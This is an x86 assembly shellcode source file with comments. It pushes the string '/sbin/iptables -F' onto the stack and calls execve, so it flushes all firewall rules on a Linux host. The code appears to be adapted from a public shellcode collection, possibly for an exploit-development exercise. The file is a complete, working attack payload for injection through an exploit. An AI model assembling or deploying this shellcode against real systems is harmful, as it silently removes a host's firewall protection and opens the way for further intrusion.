; iptables-flush.nasm
; The shellcode flushs the iptables  by running /sbin/iptables -F
; Modified from sample: http://shell-storm.org/shellcode/files/shellcode-361.php


global _start

section .text

_start:

    ; push 0x00000000 to stack for envp[]
    xor eax, eax
    push eax
    mov edx, esp            ; 3rd arg: envp[] = NULL
    
    ; push "///sbin//iptables#-F' string to stack
    push 0x462d2373         ; 'F-#s'
    push 0x656c6261         ; 'elba'
    push 0x7470692f         ; 'tpi/'
    push 0x2f6e6962         ; '/nib'
    push 0x732f2f2f         ; 's///'

    ; replace '#' with null byte
    mov byte [esp+17], al

    mov ebx, esp            ; 1st arg: *filename
    
    ; 2nd arg: *argv = [**filename, *"-F\0", NULL] pushed in reverse (right to left)
    xor eax, eax
    push eax
    lea ecx, [ebx+18]
    push ecx
    push ebx
    mov ecx, esp

    mov al, 0xb
    int 0x80
